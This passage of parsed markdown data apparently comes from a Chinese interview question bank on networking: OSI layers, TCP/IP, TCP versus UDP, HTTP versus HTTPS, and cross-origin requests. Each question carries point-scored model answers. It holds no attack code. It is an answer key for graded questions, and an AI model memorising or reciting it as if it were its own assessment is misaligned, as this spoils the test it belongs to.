数据链路层（第2层）：</p>\\n<ul>\\n<li>相邻节点之间的数据传输</li>\\n<li>差错检测和纠正</li>\\n<li>数据单位：帧</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 物理层（第1层）：</p>\\n<ul>\\n<li>比特流的传输</li>\\n<li>定义物理媒介、接口和电气特性</li>\\n<li>数据单位：比特</li>\\n</ul>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 计算机网络\\n\\n","depth":1,"text":"计算机网络","tokens":[{"type":"text","raw":"计算机网络","text":"计算机网络","escaped":false}]},{"type":"heading","raw":"## 网络协议是什么\\n\\n","depth":2,"text":"网络协议是什么","tokens":[{"type":"text","raw":"网络协议是什么","text":"网络协议是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。","task":false,"loose":false,"text":"**1：** 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。","tokens":[{"type":"text","raw":"**1：** 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。","text":"**1：** 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。","text":" 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是TCP/IP和UDP\\n\\n","depth":2,"text":"什么是TCP/IP和UDP","tokens":[{"type":"text","raw":"什么是TCP/IP和UDP","text":"什么是TCP/IP和UDP","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达\\n- **1：** UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达\\n","task":false,"loose":false,"text":"**1：** TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","tokens":[{"type":"text","raw":"**1：** TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","text":"**1：** TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","text":" TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","escaped":false}]}]},{"type":"list_item","raw":"- **1：** UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的","task":false,"loose":false,"text":"**1：** UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的","tokens":[{"type":"text","raw":"**1：** UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的","text":"**1：** UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的","text":" UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## TCP与UDP区别是什么\\n\\n","depth":2,"text":"TCP与UDP区别是什么","tokens":[{"type":"text","raw":"TCP与UDP区别是什么","text":"TCP与UDP区别是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（8 分）\\n\\n","depth":4,"text":"解答（8 分）","tokens":[{"type":"text","raw":"解答（8 分）","text":"解答（8 分）","escaped":false}]},{"type":"list","raw":"- **1：** TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达\\n- **1：** UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；\\n- **1：** TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；\\n- **1：** UDP通信类似于学校广播，靠着广播播报直接进行通信。\\n- **1：** TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；\\n- **1：** TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。\\n- **1：** TCP首部开销（20字节）比UDP首部开销（8字节）要大\\n- **1：** UDP 的主机不需要维持复杂的连接状态表","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达\\n","task":false,"loose":false,"text":"**1：** TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","tokens":[{"type":"text","raw":"**1：** TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","text":"**1：** TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","text":" TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达","escaped":false}]}]},{"type":"list_item","raw":"- **1：** UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；\\n","task":false,"loose":false,"text":"**1：** UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；","tokens":[{"type":"text","raw":"**1：** UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；","text":"**1：** UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；","text":" UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；\\n","task":false,"loose":false,"text":"**1：** TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；","tokens":[{"type":"text","raw":"**1：** TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；","text":"**1：** TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；","text":" TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** UDP通信类似于学校广播，靠着广播播报直接进行通信。\\n","task":false,"loose":false,"text":"**1：** UDP通信类似于学校广播，靠着广播播报直接进行通信。","tokens":[{"type":"text","raw":"**1：** UDP通信类似于学校广播，靠着广播播报直接进行通信。","text":"**1：** UDP通信类似于学校广播，靠着广播播报直接进行通信。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" UDP通信类似于学校广播，靠着广播播报直接进行通信。","text":" UDP通信类似于学校广播，靠着广播播报直接进行通信。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；\\n","task":false,"loose":false,"text":"**1：** TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；","tokens":[{"type":"text","raw":"**1：** TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；","text":"**1：** TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；","text":" TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。\\n","task":false,"loose":false,"text":"**1：** TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。","tokens":[{"type":"text","raw":"**1：** TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。","text":"**1：** TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。","text":" TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TCP首部开销（20字节）比UDP首部开销（8字节）要大\\n","task":false,"loose":false,"text":"**1：** TCP首部开销（20字节）比UDP首部开销（8字节）要大","tokens":[{"type":"text","raw":"**1：** TCP首部开销（20字节）比UDP首部开销（8字节）要大","text":"**1：** TCP首部开销（20字节）比UDP首部开销（8字节）要大","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TCP首部开销（20字节）比UDP首部开销（8字节）要大","text":" TCP首部开销（20字节）比UDP首部开销（8字节）要大","escaped":false}]}]},{"type":"list_item","raw":"- **1：** UDP 的主机不需要维持复杂的连接状态表","task":false,"loose":false,"text":"**1：** UDP 的主机不需要维持复杂的连接状态表","tokens":[{"type":"text","raw":"**1：** UDP 的主机不需要维持复杂的连接状态表","text":"**1：** UDP 的主机不需要维持复杂的连接状态表","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" UDP 的主机不需要维持复杂的连接状态表","text":" UDP 的主机不需要维持复杂的连接状态表","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## HTTP和HTTPS的区别是什么？\\n\\n","depth":2,"text":"HTTP和HTTPS的区别是什么？","tokens":[{"type":"text","raw":"HTTP和HTTPS的区别是什么？","text":"HTTP和HTTPS的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 安全性：\\n\\n  + HTTP是明文传输，数据可能被窃听和篡改\\n  + HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护\\n- **1：** 端口：\\n\\n  + HTTP默认使用80端口\\n  + HTTPS默认使用443端口\\n- **1：** 证书：\\n\\n  + HTTP不需要证书\\n  + HTTPS需要CA机构颁发的SSL证书\\n- **1：** 性能：\\n\\n  + HTTP性能更好，因为没有加密解密过程\\n  + HTTPS因为需要加密解密，性能会有所损耗\\n- **1：** 使用场景：\\n\\n  + HTTP适用于对安全要求不高的场景\\n  + HTTPS适用于需要保护用户隐私和数据安全的场景","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 安全性：\\n\\n  + HTTP是明文传输，数据可能被窃听和篡改\\n  + HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护\\n","task":false,"loose":true,"text":"**1：** 安全性：\\n\\n+ HTTP是明文传输，数据可能被窃听和篡改\\n+ HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","tokens":[{"type":"text","raw":"**1：** 安全性：","text":"**1：** 安全性：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 安全性：","text":" 安全性：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ HTTP是明文传输，数据可能被窃听和篡改\\n+ HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ HTTP是明文传输，数据可能被窃听和篡改\\n","task":false,"loose":false,"text":"HTTP是明文传输，数据可能被窃听和篡改","tokens":[{"type":"text","raw":"HTTP是明文传输，数据可能被窃听和篡改","text":"HTTP是明文传输，数据可能被窃听和篡改","tokens":[{"type":"text","raw":"HTTP是明文传输，数据可能被窃听和篡改","text":"HTTP是明文传输，数据可能被窃听和篡改","escaped":false}]}]},{"type":"list_item","raw":"+ HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","task":false,"loose":false,"text":"HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","tokens":[{"type":"text","raw":"HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","text":"HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","tokens":[{"type":"text","raw":"HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","text":"HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 端口：\\n\\n  + HTTP默认使用80端口\\n  + HTTPS默认使用443端口\\n","task":false,"loose":true,"text":"**1：** 端口：\\n\\n+ HTTP默认使用80端口\\n+ HTTPS默认使用443端口","tokens":[{"type":"text","raw":"**1：** 端口：","text":"**1：** 端口：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 端口：","text":" 端口：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ HTTP默认使用80端口\\n+ HTTPS默认使用443端口","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ HTTP默认使用80端口\\n","task":false,"loose":false,"text":"HTTP默认使用80端口","tokens":[{"type":"text","raw":"HTTP默认使用80端口","text":"HTTP默认使用80端口","tokens":[{"type":"text","raw":"HTTP默认使用80端口","text":"HTTP默认使用80端口","escaped":false}]}]},{"type":"list_item","raw":"+ HTTPS默认使用443端口","task":false,"loose":false,"text":"HTTPS默认使用443端口","tokens":[{"type":"text","raw":"HTTPS默认使用443端口","text":"HTTPS默认使用443端口","tokens":[{"type":"text","raw":"HTTPS默认使用443端口","text":"HTTPS默认使用443端口","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 证书：\\n\\n  + HTTP不需要证书\\n  + HTTPS需要CA机构颁发的SSL证书\\n","task":false,"loose":true,"text":"**1：** 证书：\\n\\n+ HTTP不需要证书\\n+ HTTPS需要CA机构颁发的SSL证书","tokens":[{"type":"text","raw":"**1：** 证书：","text":"**1：** 证书：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 证书：","text":" 证书：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ HTTP不需要证书\\n+ HTTPS需要CA机构颁发的SSL证书","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ HTTP不需要证书\\n","task":false,"loose":false,"text":"HTTP不需要证书","tokens":[{"type":"text","raw":"HTTP不需要证书","text":"HTTP不需要证书","tokens":[{"type":"text","raw":"HTTP不需要证书","text":"HTTP不需要证书","escaped":false}]}]},{"type":"list_item","raw":"+ HTTPS需要CA机构颁发的SSL证书","task":false,"loose":false,"text":"HTTPS需要CA机构颁发的SSL证书","tokens":[{"type":"text","raw":"HTTPS需要CA机构颁发的SSL证书","text":"HTTPS需要CA机构颁发的SSL证书","tokens":[{"type":"text","raw":"HTTPS需要CA机构颁发的SSL证书","text":"HTTPS需要CA机构颁发的SSL证书","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 性能：\\n\\n  + HTTP性能更好，因为没有加密解密过程\\n  + HTTPS因为需要加密解密，性能会有所损耗\\n","task":false,"loose":true,"text":"**1：** 性能：\\n\\n+ HTTP性能更好，因为没有加密解密过程\\n+ HTTPS因为需要加密解密，性能会有所损耗","tokens":[{"type":"text","raw":"**1：** 性能：","text":"**1：** 性能：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能：","text":" 性能：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ HTTP性能更好，因为没有加密解密过程\\n+ HTTPS因为需要加密解密，性能会有所损耗","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ HTTP性能更好，因为没有加密解密过程\\n","task":false,"loose":false,"text":"HTTP性能更好，因为没有加密解密过程","tokens":[{"type":"text","raw":"HTTP性能更好，因为没有加密解密过程","text":"HTTP性能更好，因为没有加密解密过程","tokens":[{"type":"text","raw":"HTTP性能更好，因为没有加密解密过程","text":"HTTP性能更好，因为没有加密解密过程","escaped":false}]}]},{"type":"list_item","raw":"+ HTTPS因为需要加密解密，性能会有所损耗","task":false,"loose":false,"text":"HTTPS因为需要加密解密，性能会有所损耗","tokens":[{"type":"text","raw":"HTTPS因为需要加密解密，性能会有所损耗","text":"HTTPS因为需要加密解密，性能会有所损耗","tokens":[{"type":"text","raw":"HTTPS因为需要加密解密，性能会有所损耗","text":"HTTPS因为需要加密解密，性能会有所损耗","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用场景：\\n\\n  + HTTP适用于对安全要求不高的场景\\n  + HTTPS适用于需要保护用户隐私和数据安全的场景","task":false,"loose":true,"text":"**1：** 使用场景：\\n\\n+ HTTP适用于对安全要求不高的场景\\n+ HTTPS适用于需要保护用户隐私和数据安全的场景","tokens":[{"type":"text","raw":"**1：** 使用场景：","text":"**1：** 使用场景：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景：","text":" 使用场景：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ HTTP适用于对安全要求不高的场景\\n+ HTTPS适用于需要保护用户隐私和数据安全的场景","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ HTTP适用于对安全要求不高的场景\\n","task":false,"loose":false,"text":"HTTP适用于对安全要求不高的场景","tokens":[{"type":"text","raw":"HTTP适用于对安全要求不高的场景","text":"HTTP适用于对安全要求不高的场景","tokens":[{"type":"text","raw":"HTTP适用于对安全要求不高的场景","text":"HTTP适用于对安全要求不高的场景","escaped":false}]}]},{"type":"list_item","raw":"+ HTTPS适用于需要保护用户隐私和数据安全的场景","task":false,"loose":false,"text":"HTTPS适用于需要保护用户隐私和数据安全的场景","tokens":[{"type":"text","raw":"HTTPS适用于需要保护用户隐私和数据安全的场景","text":"HTTPS适用于需要保护用户隐私和数据安全的场景","tokens":[{"type":"text","raw":"HTTPS适用于需要保护用户隐私和数据安全的场景","text":"HTTPS适用于需要保护用户隐私和数据安全的场景","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是跨域？如何解决跨域问题？\\n\\n","depth":2,"text":"什么是跨域？如何解决跨域问题？","tokens":[{"type":"text","raw":"什么是跨域？如何解决跨域问题？","text":"什么是跨域？如何解决跨域问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** 什么是跨域：\\n\\n  + 浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求\\n  + 同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据\\n- **1：** CORS（跨域资源共享）：\\n\\n  + 使用场景：现代浏览器的首选跨域解决方案，适用于REST API\\n  + 优点：支持所有类型的HTTP请求，配置灵活\\n  + 缺点：需要服务器配合，老版本浏览器可能不支持","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 什么是跨域：\\n\\n  + 浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求\\n  + 同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据\\n","task":false,"loose":true,"text":"**1：** 什么是跨域：\\n\\n+ 浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求\\n+ 同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","tokens":[{"type":"text","raw":"**1：** 什么是跨域：","text":"**1：** 什么是跨域：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 什么是跨域：","text":" 